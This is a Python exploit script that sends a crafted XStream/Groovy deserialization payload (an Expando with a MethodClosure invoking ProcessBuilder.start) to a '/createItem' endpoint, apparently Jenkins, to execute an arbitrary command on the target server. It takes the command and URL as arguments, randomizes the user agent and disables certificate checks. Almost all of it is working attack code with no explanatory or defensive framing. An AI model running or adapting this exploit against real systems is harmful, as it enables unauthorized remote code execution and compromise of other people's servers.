#!/usr/bin/python3
import requests
import urllib3
import os
import random
import sys
import string
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
        'Content-Type': 'application/xml',
    }
    return headers

def create_xml(command):
    splitCommand = command.split()
    preparedCommands = ''
    for entry in splitCommand:
        preparedCommands += f'<string>{entry}</string>'
    xml = f'''
<map>
   <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>{preparedCommands}</command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>'''
    return xml

def do_req(full_url,headers,cmd_xml):
    req = requests.post(full_url,headers=headers,data=cmd_xml,timeout=timeout,verify=False)

# Main
def main(argv):
    if len(sys.argv) == 3:
        command = sys.argv[1]
        url = sys.argv[2]
    else:
        print("[*] Usage: " + sys.argv[0] + " <command> <url>\n")
        exit(0)
    try:
        headers = http_headers()
        name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
        full_url = url + "/createItem?name=" + name

        print("[*] Creating XML payload containing command.")
        cmd_xml = create_xml(command)
        print("[*] Sending payload to URL: " + full_url + "\n")
        do_req(full_url,headers,cmd_xml)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
